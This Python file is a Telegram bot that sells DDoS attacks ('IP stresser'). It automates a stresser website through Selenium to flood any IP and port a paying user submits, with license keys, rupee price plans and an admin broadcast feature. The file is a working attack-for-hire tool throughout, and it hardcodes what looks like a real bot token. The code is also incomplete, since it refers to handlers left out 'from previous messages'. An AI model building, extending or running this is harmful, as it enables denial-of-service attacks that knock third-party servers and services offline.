# auto_stress_linux_broadcast.py
# python3 auto_stress_linux_broadcast.py

import re
import sqlite3
import time
import threading
import random
import string
from telebot import TeleBot
from selenium import webdriver
from selenium.webdriver.firefox.service import Service
from selenium.webdriver.firefox.options import Options as FirefoxOptions
from webdriver_manager.firefox import GeckoDriverManager
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# ────────────────────────────────────────────────
# CONFIG
# ────────────────────────────────────────────────
BOT_TOKEN = "8421640384:AAEwhC-l296tD_SKwSIclceEEtge3sb4qhc"
ADMIN_IDS = [8434238157]  # Add your other admin IDs here

WEBSITE_URL = "https://satellitestress.st/attack"

bot = TeleBot(BOT_TOKEN)

# ────────────────────────────────────────────────
# DATABASE (added users table for broadcast)
# ────────────────────────────────────────────────
conn = sqlite3.connect('bot_data.db', check_same_thread=False)
cursor = conn.cursor()

cursor.execute('''CREATE TABLE IF NOT EXISTS keys
                 (key TEXT PRIMARY KEY, type TEXT, expiry INTEGER, max_uses INTEGER,
                  remaining_uses INTEGER, max_seconds INTEGER)''')

cursor.execute('''CREATE TABLE IF NOT EXISTS state
                 (key TEXT PRIMARY KEY, value TEXT)''')

cursor.execute('''CREATE TABLE IF NOT EXISTS users
                 (user_id INTEGER PRIMARY KEY, username TEXT, first_seen INTEGER)''')

conn.commit()

lock = threading.Lock()

def db_get(key, default=None):
    with lock:
        cursor.execute("SELECT value FROM state WHERE key=?", (key,))
        row = cursor.fetchone()
        return row[0] if row else default

def db_set(key, value):
    with lock:
        cursor.execute("INSERT OR REPLACE INTO state (key, value) VALUES (?, ?)", (key, value))
        conn.commit()

def add_user(user_id, username):
    with lock:
        cursor.execute(
            "INSERT OR IGNORE INTO users (user_id, username, first_seen) VALUES (?, ?, ?)",
            (user_id, username, int(time.time()))
        )
        conn.commit()

# ────────────────────────────────────────────────
# GLOBAL ATTACK LOCK (same)
# ────────────────────────────────────────────────
current_attack_end = 0

def is_attack_running():
    global current_attack_end
    if current_attack_end > time.time():
        return True, int(current_attack_end - time.time())
    current_attack_end = 0
    db_set("attack_end", "0")
    return False, 0

def start_attack_lock(duration):
    global current_attack_end
    current_attack_end = time.time() + duration
    db_set("attack_end", str(current_attack_end))

# ────────────────────────────────────────────────
# KEY HELPERS (same)
# ────────────────────────────────────────────────
def generate_key(length=12):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))

def create_key(key_type="normal", days=7, uses=1, max_sec=300):
    key = generate_key()
    expiry = int(time.time()) + (days * 86400)
    with lock:
        cursor.execute(
            "INSERT INTO keys (key, type, expiry, max_uses, remaining_uses, max_seconds) VALUES (?,?,?,?,?,?)",
            (key, key_type, expiry, uses, uses, max_sec)
        )
        conn.commit()
    return key

def claim_key(user_id, key_str):
    with lock:
        cursor.execute("SELECT * FROM keys WHERE key=?", (key_str,))
        row = cursor.fetchone()
        if not row:
            return False, "❌ Invalid key!"
        k, typ, exp, maxu, rem, maxs = row
        if exp < time.time():
            return False, "⌛ Key expired!"
        if rem <= 0:
            return False, "⛔ No uses left!"
        cursor.execute("UPDATE keys SET remaining_uses = remaining_uses - 1 WHERE key=?", (key_str,))
        conn.commit()
        db_set(f"user_{user_id}_keytype", typ)
        db_set(f"user_{user_id}_maxsec", str(maxs))
        return True, f"🎉 *Key activated!*\nType: *{typ}*\nMax seconds: *{maxs}s*"

# ────────────────────────────────────────────────
# ATTACK FUNCTION (Firefox default)
# ────────────────────────────────────────────────
def perform_attack(message, ip, port, duration, cmd_type="hello"):
    user_id = message.from_user.id
    keytype = db_get(f"user_{user_id}_keytype") or "none"
    max_sec = int(db_get(f"user_{user_id}_maxsec") or 300)

    if keytype == "none":
        bot.reply_to(message, "🔑 *Activate a key first!*\nUse `/claim <key>`")
        return

    if duration > max_sec:
        bot.reply_to(message, f"⚠️ *Max allowed: {max_sec}s with your key!*")
        return

    running, rem = is_attack_running()
    if running:
        bot.reply_to(message, f"⏳ *Wait {rem}s* – another attack active.")
        return

    try:
        firefox_options = FirefoxOptions()
        # firefox_options.add_argument('--headless')  # Uncomment for invisible mode
        firefox_options.add_argument('--no-sandbox')
        firefox_options.add_argument('--disable-gpu')

        service = Service(GeckoDriverManager().install())
        driver = webdriver.Firefox(service=service, options=firefox_options)

        wait = WebDriverWait(driver, 30)

        driver.get(WEBSITE_URL)
        wait.until(EC.presence_of_element_located(
            (By.XPATH, "//input[@placeholder='104.29.138.132' or @placeholder='80' or @placeholder='60']")
        ))

        driver.find_element(By.XPATH, "//input[@placeholder='104.29.138.132']").clear()
        driver.find_element(By.XPATH, "//input[@placeholder='104.29.138.132']").send_keys(ip)
        driver.find_element(By.XPATH, "//input[@placeholder='80']").clear()
        driver.find_element(By.XPATH, "//input[@placeholder='80']").send_keys(port)
        driver.find_element(By.XPATH, "//input[@placeholder='60']").clear()
        driver.find_element(By.XPATH, "//input[@placeholder='60']").send_keys(str(duration))

        launch_btn = wait.until(EC.element_to_be_clickable(
            (By.XPATH, "//button[contains(text(),'Launch Attack')]")
        ))
        launch_btn.click()

        start_attack_lock(duration)

        msg = bot.send_message(
            message.chat.id,
            f"🔥 *{cmd_type.upper()} ATTACK LAUNCHED!* 🔥\n"
            f"🎯 `{ip}:{port}`\n"
            f"⏱ *{duration} seconds*",
            parse_mode='Markdown'
        )

        def countdown():
            for i in range(duration, 0, -10):
                time.sleep(10)
                try:
                    bot.edit_message_text(
                        f"🔥 *Attack running* ({cmd_type})\n"
                        f"🎯 `{ip}:{port}`\n"
                        f"⏳ *{i}s remaining...*",
                        msg.chat.id, msg.message_id,
                        parse_mode='Markdown'
                    )
                except:
                    pass

            try:
                bot.edit_message_text(
                    f"✅ *Attack finished!*\n"
                    f"🎯 `{ip}:{port}` ({duration}s)",
                    msg.chat.id, msg.message_id,
                    parse_mode='Markdown'
                )
                time.sleep(6)
                bot.delete_message(msg.chat.id, msg.message_id)
                bot.delete_message(message.chat.id, message.message_id)
            except:
                pass

            global current_attack_end
            current_attack_end = 0

        threading.Thread(target=countdown, daemon=True).start()

        time.sleep(2)
        driver.quit()

    except Exception as e:
        bot.reply_to(message, f"❌ *Error:*\n{str(e)}", parse_mode='Markdown')

# ────────────────────────────────────────────────
# BROADCAST COMMAND (new)
# ────────────────────────────────────────────────
@bot.message_handler(commands=['broadcast'])
def cmd_broadcast(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "🚫 Admin only command!")
        return

    text = message.text.replace("/broadcast", "").strip()
    if not text:
        bot.reply_to(message, "Usage: `/broadcast Your message here`", parse_mode='Markdown')
        return

    with lock:
        cursor.execute("SELECT user_id FROM users")
        users = cursor.fetchall()

    sent = 0
    failed = 0
    for (user_id,) in users:
        try:
            bot.send_message(user_id, f"📢 *Broadcast from admin:*\n\n{text}", parse_mode='Markdown')
            sent += 1
        except:
            failed += 1

    bot.reply_to(message, f"✅ Broadcast sent!\nDelivered to {sent} users\nFailed: {failed}")

# ────────────────────────────────────────────────
# TRACK USERS FOR BROADCAST (on every message)
# ────────────────────────────────────────────────
@bot.message_handler(func=lambda m: True)
def track_user(message):
    user_id = message.from_user.id
    username = message.from_user.username or message.from_user.first_name
    add_user(user_id, username)
    # Continue to other handlers
    return False  # Let other handlers process

# ────────────────────────────────────────────────
# ALL OTHER COMMANDS (same as before)
# ────────────────────────────────────────────────

@bot.message_handler(commands=['start'])
def cmd_start(message):
    text = (
        "🌟 *Welcome to SATELLITESTRESS BOT* 🌟\n\n"
        "⚡ Fastest & Cheapest IP Stresser on Telegram ⚡\n"
        "Servers: Singapore • Europe • Maharashtra • France\n\n"
        "🚀 *Start now:*\n1. Buy key → @admin\n2. `/claim YOURKEY`\n3. `/hello IP PORT TIME`\n\n"
        "📋 `/help` or `/cmd` → all commands\n💰 `/price` → plans\n\n"
        "🔥 *Stay powerful!* 🔥"
    )
    bot.reply_to(message, text, parse_mode='Markdown')

@bot.message_handler(commands=['help', 'cmd'])
def cmd_help_cmd(message):
    text = (
        "📋 *All Commands*\n\n"
        "• `/start` → Welcome\n"
        "• `/hello IP PORT SECONDS` → Normal attack\n"
        "• `/minecraft IP PORT SECONDS` → Premium only\n"
        "• `/domain IP PORT SECONDS` → Premium only\n"
        "• `/claim <key>` → Activate key\n"
        "• `/price` → Plans & prices\n"
        "• `/tutorial` → How to use\n"
        "• `/speed` → Network info\n"
        "• `/help` or `/cmd` → This list\n"
        "• `/uptime` → Bot status\n"
        "• `/broadcast <msg>` → Admin only\n\n"
        "Premium unlocks extra commands\nCustom time → @admin"
    )
    bot.reply_to(message, text, parse_mode='Markdown')

@bot.message_handler(commands=['price'])
def cmd_price(message):
    text = (
        "💰 *Plans*\n\n"
        "*Normal* (/hello only):\n• 1 Day → ₹70\n• 2 Days → ₹130\n• 3 Days → ₹200\n• 1 Week → ₹400\n• 1 Month → ₹900\n• Season → ₹1500\n\n"
        "*Premium* (/hello + /minecraft + /domain):\n• 1 Day → ₹90\n• 2 Days → ₹150\n• 3 Days → ₹250\n• 1 Week → ₹460\n• 1 Month → ₹1100\n\n"
        "Default: 300s\n600s/1200s → @admin\n\nCheapest on TG 🔥"
    )
    bot.reply_to(message, text, parse_mode='Markdown')

# ... (keep /tutorial, /speed, /uptime, /genkey, /genpremium, /claim, attack commands from previous messages)

print("Linux bot with broadcast ready – Firefox default")
bot.infinity_polling(timeout=60, long_polling_timeout=60)
